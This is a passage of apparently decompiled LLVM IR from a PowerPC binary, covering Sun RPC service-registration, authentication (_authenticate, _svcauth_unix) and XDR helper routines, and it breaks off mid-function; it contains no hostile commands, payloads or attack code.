  %v1_10010f88 = add i32 %v0_10010f88, 180
  %v2_10010f88 = inttoptr i32 %v1_10010f88 to i32*
  %v3_10010f88 = load i32, i32* %v2_10010f88, align 4
  %v1_10010f8c = mul i32 %v2_10010f54, 4
  store i32 %v1_10010f8c, i32* %r9.global-to-local, align 4
  %v0_10010f90 = load i32, i32* @r30, align 4
  %v3_10010f90 = add i32 %v3_10010f88, %v1_10010f8c
  %v4_10010f90 = inttoptr i32 %v3_10010f90 to i32*
  store i32 %v0_10010f90, i32* %v4_10010f90, align 4
  br i1 %v2_10010f84, label %dec_label_pc_10010fb8, label %dec_label_pc_10010f98

dec_label_pc_10010f98:                            ; preds = %dec_label_pc_10010f84
  store i32 268504988, i32* @lr, align 4
  %v0_10010f98 = load i32, i32* %r3.global-to-local, align 4
  %v2_10010f98 = call i32 @__GI___rpc_thread_svc_fdset(i32 %v0_10010f98, i32 %v1_10010f8c)
  store i32 %v2_10010f98, i32* %r3.global-to-local, align 4
  %v1_10010f9c = call i32 @__asm_rlwinm(i32 %v2_10010f54, i32 29, i32 3, i32 29)
  store i32 %v1_10010f9c, i32* @r10, align 4
  %v2_10010fa0 = add i32 %v1_10010f9c, %v2_10010f98
  %v3_10010fa0 = inttoptr i32 %v2_10010fa0 to i32*
  %v4_10010fa0 = load i32, i32* %v3_10010fa0, align 4
  %v1_10010fa4 = urem i32 %v2_10010f54, 32
  %v3_10010fac = shl i32 1, %v1_10010fa4
  %v2_10010fb0 = or i32 %v4_10010fa0, %v3_10010fac
  store i32 %v2_10010fb0, i32* %r9.global-to-local, align 4
  store i32 %v2_10010fb0, i32* %v3_10010fa0, align 4
  br label %dec_label_pc_10010fb8

dec_label_pc_10010fb8:                            ; preds = %dec_label_pc_10010f84, %dec_label_pc_10010f98
  store i32 0, i32* @r31, align 4
  br label %dec_label_pc_10010ff8

dec_label_pc_10010fc0:                            ; preds = %dec_label_pc_10010ff8
  store i32 268505028, i32* @lr, align 4
  %v0_10010fc0 = call i32 @__rpc_thread_svc_pollfd()
  store i32 %v0_10010fc0, i32* %r3.global-to-local, align 4
  %v1_10010fc4 = inttoptr i32 %v0_10010fc0 to i32*
  %v2_10010fc4 = load i32, i32* %v1_10010fc4, align 4
  store i32 %v0_10010fc0, i32* %r9.global-to-local, align 4
  %v0_10010fcc = load i32, i32* @r31, align 4
  %v1_10010fcc = mul i32 %v0_10010fcc, 8
  store i32 %v1_10010fcc, i32* %r3.global-to-local, align 4
  %v1_10010fd0 = add i32 %v0_10010fcc, 1
  store i32 %v1_10010fd0, i32* @r31, align 4
  %v2_10010fd4 = add i32 %v1_10010fcc, %v2_10010fc4
  %v3_10010fd4 = inttoptr i32 %v2_10010fd4 to i32*
  %v4_10010fd4 = load i32, i32* %v3_10010fd4, align 4
  %v3_10010fd8 = icmp eq i32 %v4_10010fd4, -1
  br i1 %v3_10010fd8, label %dec_label_pc_10010fe0, label %dec_label_pc_10010ff8

dec_label_pc_10010fe0:                            ; preds = %dec_label_pc_10010fc0
  store i32 %v2_10010f54, i32* %v3_10010fd4, align 4
  %v0_10010fe8 = load i32, i32* %r9.global-to-local, align 4
  %v1_10010fe8 = inttoptr i32 %v0_10010fe8 to i32*
  %v2_10010fe8 = load i32, i32* %v1_10010fe8, align 4
  %v1_10010fec = load i32, i32* %r3.global-to-local, align 4
  %v2_10010fec = add i32 %v1_10010fec, %v2_10010fe8
  store i32 %v2_10010fec, i32* %r9.global-to-local, align 4
  %v3_10010ff0 = add i32 %v2_10010fec, 4
  %v4_10010ff0 = inttoptr i32 %v3_10010ff0 to i16*
  store i16 195, i16* %v4_10010ff0, align 2
  br label %dec_label_pc_1001105c

dec_label_pc_10010ff8:                            ; preds = %dec_label_pc_10010fc0, %dec_label_pc_10010fb8
  store i32 268505084, i32* @lr, align 4
  %v0_10010ff8 = call i32 @__rpc_thread_svc_max_pollfd()
  store i32 %v0_10010ff8, i32* %r3.global-to-local, align 4
  %v1_10010ffc = inttoptr i32 %v0_10010ff8 to i32*
  %v2_10010ffc = load i32, i32* %v1_10010ffc, align 4
  store i32 %v0_10010ff8, i32* @r30, align 4
  %v0_10011004 = load i32, i32* @r31, align 4
  %v2_10011004 = icmp slt i32 %v0_10011004, %v2_10010ffc
  br i1 %v2_10011004, label %dec_label_pc_10010fc0, label %dec_label_pc_1001100c

dec_label_pc_1001100c:                            ; preds = %dec_label_pc_10010ff8
  %v1_1001100c = add i32 %v2_10010ffc, 1
  store i32 %v1_1001100c, i32* @r29, align 4
  store i32 %v1_1001100c, i32* %v1_10010ffc, align 4
  store i32 268505112, i32* @lr, align 4
  %v0_10011014 = call i32 @__rpc_thread_svc_pollfd()
  store i32 %v0_10011014, i32* %r3.global-to-local, align 4
  %v0_10011018 = load i32, i32* @r29, align 4
  %v1_10011018 = mul i32 %v0_10011018, 8
  store i32 %v1_10011018, i32* @r4, align 4
  %v1_10011020 = inttoptr i32 %v0_10011014 to i32*
  %v2_10011020 = load i32, i32* %v1_10011020, align 4
  store i32 %v2_10011020, i32* %r3.global-to-local, align 4
  store i32 268505128, i32* @lr, align 4
  %v1_10011024 = call i32 @realloc(i32 %v2_10011020)
  store i32 %v1_10011024, i32* %r3.global-to-local, align 4
  %v3_10011028 = icmp eq i32 %v1_10011024, 0
  %v1_1001102c = load i32, i32* @r31, align 4
  %v2_1001102c = inttoptr i32 %v1_1001102c to i32*
  store i32 %v1_10011024, i32* %v2_1001102c, align 4
  br i1 %v3_10011028, label %dec_label_pc_1001105c, label %dec_label_pc_10011034

dec_label_pc_10011034:                            ; preds = %dec_label_pc_1001100c
  %v0_10011034 = load i32, i32* @r30, align 4
  %v1_10011034 = inttoptr i32 %v0_10011034 to i32*
  %v2_10011034 = load i32, i32* %v1_10011034, align 4
  %v1_10011038 = mul i32 %v2_10011034, 8
  %v1_1001103c = load i32, i32* %r3.global-to-local, align 4
  %v2_1001103c = add i32 %v1_1001103c, %v1_10011038
  store i32 %v2_1001103c, i32* %r9.global-to-local, align 4
  %v2_10011040 = add i32 %v2_1001103c, -8
  %v3_10011040 = inttoptr i32 %v2_10011040 to i32*
  store i32 %v2_10010f54, i32* %v3_10011040, align 4
  %v0_10011044 = load i32, i32* @r30, align 4
  %v1_10011044 = inttoptr i32 %v0_10011044 to i32*
  %v2_10011044 = load i32, i32* %v1_10011044, align 4
  store i32 %v2_10011044, i32* %r9.global-to-local, align 4
  %v0_10011048 = load i32, i32* @r31, align 4
  %v1_10011048 = inttoptr i32 %v0_10011048 to i32*
  %v2_10011048 = load i32, i32* %v1_10011048, align 4
  %v1_1001104c = mul i32 %v2_10011044, 8
  %v2_10011050 = add i32 %v2_10011048, %v1_1001104c
  store i32 %v2_10011050, i32* %r9.global-to-local, align 4
  %v3_10011058 = add i32 %v2_10011050, -4
  %v4_10011058 = inttoptr i32 %v3_10011058 to i16*
  store i16 195, i16* %v4_10011058, align 2
  br label %dec_label_pc_1001105c

dec_label_pc_1001105c:                            ; preds = %dec_label_pc_10010f78, %dec_label_pc_1001100c, %dec_label_pc_10010f60, %dec_label_pc_10010fe0, %dec_label_pc_10011034
  %v0_1001106c = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1001106c

; uselistorder directives
  uselistorder i32 %v1_10010fcc, { 1, 0 }
  uselistorder i32 %v0_10010fcc, { 1, 0 }
  uselistorder i32 %v1_10010f8c, { 1, 2, 0 }
  uselistorder i32 %v2_10010f54, { 3, 6, 0, 2, 1, 5, 4 }
  uselistorder i32* %r3.global-to-local, { 12, 1, 2, 3, 4, 8, 5, 6, 7, 9, 10, 11, 13, 14, 0 }
  uselistorder i32 ()* @__rpc_thread_svc_max_pollfd, { 3, 2, 1, 0 }
  uselistorder i16 195, { 1, 0 }
  uselistorder i32 ()* @__rpc_thread_svc_pollfd, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI___rpc_thread_svc_fdset, { 1, 0 }
  uselistorder i32 1023, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 ()* @_rpc_dtablesize, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1001105c, { 4, 1, 3, 0, 2 }
  uselistorder label %dec_label_pc_10010fb8, { 1, 0 }
  uselistorder label %dec_label_pc_10010f78, { 1, 0 }
}

define i32 @_authenticate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %v1_10011078 = add i32 %arg1, 12
  %v1_1001107c = add i32 %arg2, 24
  store i32 %v1_1001107c, i32* @r10, align 4
  %v3_10011090 = load i32, i32* @global_var_10030d10.393, align 4
  %v1_10011094 = add i32 %arg1, 28
  %v2_10011094 = inttoptr i32 %v1_10011094 to i32*
  %v3_10011094 = load i32, i32* %v2_10011094, align 4
  %v2_10011098 = add i32 %v3_10011094, 32
  %v3_10011098 = inttoptr i32 %v2_10011098 to i32*
  store i32 %v3_10011090, i32* %v3_10011098, align 4
  %v2_1001109c = inttoptr i32 %v1_10011078 to i32*
  %v3_1001109c = load i32, i32* %v2_1001109c, align 4
  %v3_100110a0 = load i32, i32* %v2_10011094, align 4
  %v1_100110a8 = mul i32 %v3_1001109c, 4
  store i32 %v1_100110a8, i32* %r11.global-to-local, align 4
  %v2_100110b0 = add i32 %v3_100110a0, 40
  %v3_100110b0 = inttoptr i32 %v2_100110b0 to i32*
  store i32 0, i32* %v3_100110b0, align 4
  %v0_100110c4 = load i32, i32* %r11.global-to-local, align 4
  %v2_100110c4 = add i32 %v0_100110c4, ptrtoint (i32* @global_var_1001737c.412 to i32)
  %v3_100110c4 = inttoptr i32 %v2_100110c4 to i32*
  %v4_100110c4 = load i32, i32* %v3_100110c4, align 4
  store i32 %v4_100110c4, i32* %r11.global-to-local, align 4
  call void @__pseudo_call(i32 %v4_100110c4)
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
}

define i32 @_svcauth_null() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @_svcauth_short() local_unnamed_addr {
entry:
  ret i32 2
}

define i32 @_svcauth_unix(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_100110f8 = load i32, i32* @lr, align 4
  store i32 %v0_100110f8, i32* %r0.global-to-local, align 4
  %v2_10011108 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10011108, i32* %r31.global-to-local, align 4
  store i32 %arg2, i32* @r28, align 4
  store i32 %arg1, i32* @r26, align 4
  %v1_10011118 = add i32 %arg1, 24
  %v2_10011118 = inttoptr i32 %v1_10011118 to i32*
  %v3_10011118 = load i32, i32* %v2_10011118, align 4
  store i32 %v3_10011118, i32* %r30.global-to-local, align 4
  store i32 %v2_10011108, i32* %r3.global-to-local, align 4
  %v1_10011120 = add i32 %v3_10011118, 24
  store i32 %v1_10011120, i32* %r0.global-to-local, align 4
  %v1_10011124 = add i32 %v3_10011118, 280
  store i32 %v1_10011124, i32* %r9.global-to-local, align 4
  %v2_10011128 = add i32 %v3_10011118, 4
  %v3_10011128 = inttoptr i32 %v2_10011128 to i32*
  store i32 %v1_10011120, i32* %v3_10011128, align 4
  %v0_1001112c = load i32, i32* %r9.global-to-local, align 4
  %v1_1001112c = load i32, i32* %r30.global-to-local, align 4
  %v2_1001112c = add i32 %v1_1001112c, 20
  %v3_1001112c = inttoptr i32 %v2_1001112c to i32*
  store i32 %v0_1001112c, i32* %v3_1001112c, align 4
  %v1_10011130 = add i32 %arg2, 32
  %v2_10011130 = inttoptr i32 %v1_10011130 to i32*
  %v3_10011130 = load i32, i32* %v2_10011130, align 4
  store i32 %v3_10011130, i32* %r27.global-to-local, align 4
  %v1_10011134 = add i32 %arg2, 28
  %v2_10011134 = inttoptr i32 %v1_10011134 to i32*
  %v3_10011134 = load i32, i32* %v2_10011134, align 4
  %v5_1001113c = call i32 @__GI_xdrmem_create(i32* nonnull %stack_var_-56, i32 %v3_10011134, i32 %v3_10011130, i32 1)
  %v3_10011140 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_10011140, i32* %r9.global-to-local, align 4
  store i32 %v2_10011108, i32* %r3.global-to-local, align 4
  %v1_1001114c = add i32 %v3_10011140, 24
  %v2_1001114c = inttoptr i32 %v1_1001114c to i32*
  %v3_1001114c = load i32, i32* %v2_1001114c, align 4
  store i32 %v3_1001114c, i32* %r9.global-to-local, align 4
  store i32 %v3_1001114c, i32* %ctr.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_1001114c)
  %v0_10011158 = load i32, i32* %r3.global-to-local, align 4
  %v3_10011158 = icmp eq i32 %v0_10011158, 0
  br i1 %v3_10011158, label %dec_label_pc_10011238, label %dec_label_pc_10011160

dec_label_pc_10011160:                            ; preds = %entry
  %v2_10011160 = load i32, i32* %stack_var_-56, align 4
  store i32 %v2_10011160, i32* %r0.global-to-local, align 4
  %v2_10011164 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_10011164, i32* %r29.global-to-local, align 4
  %v1_10011168 = load i32, i32* %r30.global-to-local, align 4
  %v2_10011168 = inttoptr i32 %v1_10011168 to i32*
  store i32 %v2_10011160, i32* %v2_10011168, align 4
  %v3_1001116c = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_1001116c, i32* %r31.global-to-local, align 4
  %v2_10011170 = icmp ugt i32 %v3_1001116c, 255
  br i1 %v2_10011170, label %dec_label_pc_100112a4, label %dec_label_pc_10011178

dec_label_pc_10011178:                            ; preds = %dec_label_pc_10011160
  %v2_10011178 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_10011178, i32* %r29.global-to-local, align 4
  %v0_1001117c = load i32, i32* %r30.global-to-local, align 4
  %v1_1001117c = add i32 %v0_1001117c, 4
  %v2_1001117c = inttoptr i32 %v1_1001117c to i32*
  %v3_1001117c = load i32, i32* %v2_1001117c, align 4
  store i32 %v3_1001117c, i32* @r3, align 4
  store i32 %v2_10011178, i32* @r4, align 4
  store i32 %v3_1001116c, i32* @r5, align 4
  store i32 268505484, i32* @lr, align 4
  %v0_10011188 = call i32 @memcpy()
  store i32 %v0_10011188, i32* %r3.global-to-local, align 4
  %v0_1001118c = load i32, i32* %r30.global-to-local, align 4
  %v1_1001118c = add i32 %v0_1001118c, 4
  %v2_1001118c = inttoptr i32 %v1_1001118c to i32*
  %v3_1001118c = load i32, i32* %v2_1001118c, align 4
  store i32 %v3_1001118c, i32* %r9.global-to-local, align 4
  %v2_10011194 = load i32, i32* %r31.global-to-local, align 4
  %v4_10011194 = add i32 %v2_10011194, %v3_1001118c
  %v5_10011194 = inttoptr i32 %v4_10011194 to i8*
  store i8 0, i8* %v5_10011194, align 1
  %v0_10011198 = load i32, i32* %r31.global-to-local, align 4
  %v1_10011198 = add i32 %v0_10011198, 3
  store i32 %v1_10011198, i32* %r0.global-to-local, align 4
  %v1_1001119c = call i32 @__asm_rlwinm(i32 %v1_10011198, i32 0, i32 0, i32 29)
  %v0_100111a0 = load i32, i32* %r29.global-to-local, align 4
  %v2_100111a0 = add i32 %v0_100111a0, %v1_1001119c
  %v3_100111a0 = inttoptr i32 %v2_100111a0 to i32*
  %v4_100111a0 = load i32, i32* %v3_100111a0, align 4
  store i32 %v4_100111a0, i32* %r0.global-to-local, align 4
  store i32 %v2_100111a0, i32* %r29.global-to-local, align 4
  %v1_100111a8 = add i32 %v2_100111a0, 4
  store i32 %v1_100111a8, i32* %r9.global-to-local, align 4
  %v1_100111ac = load i32, i32* %r30.global-to-local, align 4
  %v2_100111ac = add i32 %v1_100111ac, 8
  %v3_100111ac = inttoptr i32 %v2_100111ac to i32*
  store i32 %v4_100111a0, i32* %v3_100111ac, align 4
  %v0_100111b0 = load i32, i32* %r9.global-to-local, align 4
  %v1_100111b0 = add i32 %v0_100111b0, 4
  store i32 %v1_100111b0, i32* %r11.global-to-local, align 4
  %v0_100111b4 = load i32, i32* %r29.global-to-local, align 4
  %v1_100111b4 = add i32 %v0_100111b4, 4
  %v2_100111b4 = inttoptr i32 %v1_100111b4 to i32*
  %v3_100111b4 = load i32, i32* %v2_100111b4, align 4
  store i32 %v3_100111b4, i32* %r0.global-to-local, align 4
  %v1_100111b8 = load i32, i32* %r30.global-to-local, align 4
  %v2_100111b8 = add i32 %v1_100111b8, 12
  %v3_100111b8 = inttoptr i32 %v2_100111b8 to i32*
  store i32 %v3_100111b4, i32* %v3_100111b8, align 4
  %v0_100111bc = load i32, i32* %r9.global-to-local, align 4
  %v1_100111bc = add i32 %v0_100111bc, 4
  %v2_100111bc = inttoptr i32 %v1_100111bc to i32*
  %v3_100111bc = load i32, i32* %v2_100111bc, align 4
  %v2_100111c0 = icmp ugt i32 %v3_100111bc, 16
  br i1 %v2_100111c0, label %dec_label_pc_100112a4, label %dec_label_pc_100111c8

dec_label_pc_100111c8:                            ; preds = %dec_label_pc_10011178
  %v3_100111c8 = icmp eq i32 %v3_100111bc, 0
  %v1_100111cc = add i32 %v3_100111bc, 1
  store i32 %v1_100111cc, i32* %r0.global-to-local, align 4
  %v0_100111d0 = load i32, i32* %r11.global-to-local, align 4
  %v1_100111d0 = add i32 %v0_100111d0, 4
  store i32 %v1_100111d0, i32* %r11.global-to-local, align 4
  %v1_100111d4 = load i32, i32* %r30.global-to-local, align 4
  %v2_100111d4 = add i32 %v1_100111d4, 16
  %v3_100111d4 = inttoptr i32 %v2_100111d4 to i32*
  store i32 %v3_100111bc, i32* %v3_100111d4, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  %v0_100111dc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_100111dc, i32* %ctr.global-to-local, align 4
  br i1 %v3_100111c8, label %dec_label_pc_10011200.preheader.thread, label %dec_label_pc_10011200.preheader

dec_label_pc_10011200.preheader.thread:           ; preds = %dec_label_pc_100111c8
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r10.global-to-local, align 4
  store i32 0, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1001120c

dec_label_pc_10011200.preheader:                  ; preds = %dec_label_pc_100111c8
  store i32 1, i32* %r10.global-to-local, align 4
  %v1_100112085 = add i32 %v0_100111dc, -1
  store i32 %v1_100112085, i32* %ctr.global-to-local, align 4
  %v2_100112086 = icmp eq i32 %v1_100112085, 0
  br i1 %v2_100112086, label %dec_label_pc_1001120c, label %dec_label_pc_100111f0

dec_label_pc_100111f0:                            ; preds = %dec_label_pc_10011200.preheader, %dec_label_pc_100111f0
  %v1_100111fc = phi i32 [ %v1_10011200, %dec_label_pc_100111f0 ], [ 0, %dec_label_pc_10011200.preheader ]
  %v0_100111f0 = load i32, i32* %r11.global-to-local, align 4
  %v1_100111f0 = inttoptr i32 %v0_100111f0 to i32*
  %v2_100111f0 = load i32, i32* %v1_100111f0, align 4
  store i32 %v2_100111f0, i32* %r0.global-to-local, align 4
  %v1_100111f4 = add i32 %v0_100111f0, 4
  store i32 %v1_100111f4, i32* %r11.global-to-local, align 4
  %v0_100111f8 = load i32, i32* %r30.global-to-local, align 4
  %v1_100111f8 = add i32 %v0_100111f8, 20
  %v2_100111f8 = inttoptr i32 %v1_100111f8 to i32*
  %v3_100111f8 = load i32, i32* %v2_100111f8, align 4
  store i32 %v3_100111f8, i32* %r9.global-to-local, align 4
  %v3_100111fc = add i32 %v3_100111f8, %v1_100111fc
  %v4_100111fc = inttoptr i32 %v3_100111fc to i32*
  store i32 %v2_100111f0, i32* %v4_100111fc, align 4
  %v0_10011200 = load i32, i32* %r10.global-to-local, align 4
  %v1_10011200 = mul i32 %v0_10011200, 4
  %v1_10011204 = add i32 %v0_10011200, 1
  store i32 %v1_10011204, i32* %r10.global-to-local, align 4
  %v0_10011208 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10011208 = add i32 %v0_10011208, -1
  store i32 %v1_10011208, i32* %ctr.global-to-local, align 4
  %v2_10011208 = icmp eq i32 %v1_10011208, 0
  br i1 %v2_10011208, label %dec_label_pc_1001120c, label %dec_label_pc_100111f0

dec_label_pc_1001120c:                            ; preds = %dec_label_pc_100111f0, %dec_label_pc_10011200.preheader.thread, %dec_label_pc_10011200.preheader
  %v1_1001120c = mul i32 %v3_100111bc, 4
  %v1_10011210 = add i32 %v1_1001119c, 20
  store i32 %v1_10011210, i32* %r9.global-to-local, align 4
  %v2_10011214 = add i32 %v1_1001120c, %v1_10011210
  store i32 %v2_10011214, i32* %r0.global-to-local, align 4
  %v1_10011218 = load i32, i32* %r27.global-to-local, align 4
  %v3_10011218 = icmp ugt i32 %v2_10011214, %v1_10011218
  br i1 %v3_10011218, label %dec_label_pc_10011220, label %dec_label_pc_10011264

dec_label_pc_10011220:                            ; preds = %dec_label_pc_1001120c
  store i32 ptrtoint ([36 x i8]* @global_var_10017388.413 to i32), i32* %r3.global-to-local, align 4
  %v6_10011230 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @global_var_10017388.413, i32 0, i32 0), i32 %v3_100111bc, i32 %v1_1001119c, i32 %v1_10011218)
  store i32 %v6_10011230, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100112a4

dec_label_pc_10011238:                            ; preds = %entry
  store i32 %v2_10011108, i32* %r3.global-to-local, align 4
  %v0_1001123c = load i32, i32* %r30.global-to-local, align 4
  store i32 268505668, i32* @lr, align 4
  %v3_10011240 = call i32 @__GI_xdr_authunix_parms(i32* nonnull %stack_var_-56, i32 %v0_1001123c)
  store i32 %v3_10011240, i32* %r3.global-to-local, align 4
  %v3_10011244 = icmp eq i32 %v3_10011240, 0
  br i1 %v3_10011244, label %dec_label_pc_1001124c, label %dec_label_pc_10011264

dec_label_pc_1001124c:                            ; preds = %dec_label_pc_10011238
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 %v2_10011108, i32* %r3.global-to-local, align 4
  %v0_10011254 = load i32, i32* @r30, align 4
  store i32 2, i32* %stack_var_-56, align 4
  store i32 ptrtoint (i32* @global_var_10011260.415 to i32), i32* @lr, align 4
  %v3_1001125c = call i32 @__GI_xdr_authunix_parms(i32* nonnull %stack_var_-56, i32 %v0_10011254)
  store i32 %v3_1001125c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100112a4

dec_label_pc_10011264:                            ; preds = %dec_label_pc_10011238, %dec_label_pc_1001120c
  %v0_10011264 = load i32, i32* @r28, align 4
  %v1_10011264 = add i32 %v0_10011264, 44
  %v2_10011264 = inttoptr i32 %v1_10011264 to i32*
  %v3_10011264 = load i32, i32* %v2_10011264, align 4
  store i32 %v3_10011264, i32* %r10.global-to-local, align 4
  %v0_10011268 = load i32, i32* @r26, align 4
  %v1_10011268 = add i32 %v0_10011268, 28
  %v2_10011268 = inttoptr i32 %v1_10011268 to i32*
  %v3_10011268 = load i32, i32* %v2_10011268, align 4
  store i32 %v3_10011268, i32* %r9.global-to-local, align 4
  %v3_1001126c = icmp eq i32 %v3_10011264, 0
  br i1 %v3_1001126c, label %dec_label_pc_10011290, label %dec_label_pc_10011274

dec_label_pc_10011274:                            ; preds = %dec_label_pc_10011264
  %v1_10011274 = add i32 %v0_10011264, 36
  %v2_10011274 = inttoptr i32 %v1_10011274 to i32*
  %v3_10011274 = load i32, i32* %v2_10011274, align 4
  store i32 %v3_10011274, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r31.global-to-local, align 4
  %v1_1001127c = add i32 %v0_10011264, 40
  %v2_1001127c = inttoptr i32 %v1_1001127c to i32*
  %v3_1001127c = load i32, i32* %v2_1001127c, align 4
  store i32 %v3_1001127c, i32* %r11.global-to-local, align 4
  %v2_10011280 = add i32 %v3_10011268, 32
  %v3_10011280 = inttoptr i32 %v2_10011280 to i32*
  store i32 %v3_10011274, i32* %v3_10011280, align 4
  %v0_10011284 = load i32, i32* @r26, align 4
  %v1_10011284 = add i32 %v0_10011284, 28
  %v2_10011284 = inttoptr i32 %v1_10011284 to i32*
  %v3_10011284 = load i32, i32* %v2_10011284, align 4
  store i32 %v3_10011284, i32* %r9.global-to-local, align 4
  %v0_10011288 = load i32, i32* %r11.global-to-local, align 4
  %v2_10011288 = add i32 %v3_10011284, 36
  %v3_10011288 = inttoptr i32 %v2_10011288 to i32*
  store i32 %v0_10011288, i32* %v3_10011288, align 4
  br label %dec_label_pc_10011298

dec_label_pc_10011290:                            ; preds = %dec_label_pc_10011264
  %v2_10011290 = add i32 %v3_10011268, 32
  %v3_10011290 = inttoptr i32 %v2_10011290 to i32*
  store i32 0, i32* %v3_10011290, align 4
  store i32 0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10011298

dec_label_pc_10011298:                            ; preds = %dec_label_pc_10011274, %dec_label_pc_10011290
  %v0_10011298 = load i32, i32* @r26, align 4
  %v1_10011298 = add i32 %v0_10011298, 28
  %v2_10011298 = inttoptr i32 %v1_10011298 to i32*
  %v3_10011298 = load i32, i32* %v2_10011298, align 4
  store i32 %v3_10011298, i32* %r9.global-to-local, align 4
  %v0_1001129c = load i32, i32* %r10.global-to-local, align 4
  %v2_1001129c = add i32 %v3_10011298, 40
  %v3_1001129c = inttoptr i32 %v2_1001129c to i32*
  store i32 %v0_1001129c, i32* %v3_1001129c, align 4
  br label %dec_label_pc_100112a8

dec_label_pc_100112a4:                            ; preds = %dec_label_pc_10011178, %dec_label_pc_10011160, %dec_label_pc_1001124c, %dec_label_pc_10011220
  store i32 1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100112a8

dec_label_pc_100112a8:                            ; preds = %dec_label_pc_10011298, %dec_label_pc_100112a4
  %v3_100112a8 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_100112a8, i32* %r9.global-to-local, align 4
  %v1_100112ac = add i32 %v3_100112a8, 28
  %v2_100112ac = inttoptr i32 %v1_100112ac to i32*
  %v3_100112ac = load i32, i32* %v2_100112ac, align 4
  store i32 %v3_100112ac, i32* %r0.global-to-local, align 4
  %v3_100112b0 = icmp eq i32 %v3_100112ac, 0
  br i1 %v3_100112b0, label %dec_label_pc_100112c4, label %dec_label_pc_100112b8

dec_label_pc_100112b8:                            ; preds = %dec_label_pc_100112a8
  store i32 %v2_10011108, i32* %r3.global-to-local, align 4
  store i32 %v3_100112ac, i32* %ctr.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_100112ac)
  br label %dec_label_pc_100112c4

dec_label_pc_100112c4:                            ; preds = %dec_label_pc_100112a8, %dec_label_pc_100112b8
  store i32 %v0_100110f8, i32* %r0.global-to-local, align 4
  %v0_100112c8 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_100112c8, i32* %r3.global-to-local, align 4
  ret i32 %v0_100112c8

; uselistorder directives
  uselistorder i32 %v3_100112ac, { 1, 0, 2, 3 }
  uselistorder i32 %v0_10011264, { 1, 0, 2 }
  uselistorder i32 %v1_10011208, { 1, 0 }
  uselistorder i32 %v0_10011200, { 1, 0 }
  uselistorder i32 %v3_100111bc, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32 %v2_100111a0, { 1, 0, 2 }
  uselistorder i32 %v1_1001119c, { 1, 2, 0 }
  uselistorder i32* %stack_var_-56, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32* %stack_var_-52, { 0, 1, 3, 2 }
  uselistorder i32* %r31.global-to-local, { 2, 0, 1, 3, 4, 5, 6, 7 }
  uselistorder i32* %r30.global-to-local, { 0, 1, 2, 3, 4, 7, 5, 6, 8, 9 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 0 }
  uselistorder i32* %r10.global-to-local, { 0, 1, 2, 5, 6, 4, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 6, 7, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %ctr.global-to-local, { 0, 1, 5, 6, 4, 2, 3 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100112c4, { 1, 0 }
  uselistorder label %dec_label_pc_100112a8, { 1, 0 }
  uselistorder label %dec_label_pc_100112a4, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_10011298, { 1, 0 }
  uselistorder label %dec_label_pc_1001120c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_100111f0, { 1, 0 }
}

define i32 @xdr_free(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_100112e8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 2, i32* %stack_var_-40, align 4
  call void @__pseudo_call(i32 %arg1)
  ret i32 %v2_100112e8
}

define i32 @xdr_void() local_unnamed_addr {
entry:
  ret i32 1
}

define i32 @__GI_xdr_long() local_unnamed_addr {
entry:
  %v0_10011324 = load i32, i32* @r3, align 4
  %v1_10011324 = inttoptr i32 %v0_10011324 to i32*
  %v2_10011324 = load i32, i32* %v1_10011324, align 4
  %v3_10011328 = icmp eq i32 %v2_10011324, 0
  br i1 %v3_10011328, label %dec_label_pc_10011334, label %dec_label_pc_10011340

dec_label_pc_10011334:                            ; preds = %entry
  %v1_10011334 = add i32 %v0_10011324, 4
  %v2_10011334 = inttoptr i32 %v1_10011334 to i32*
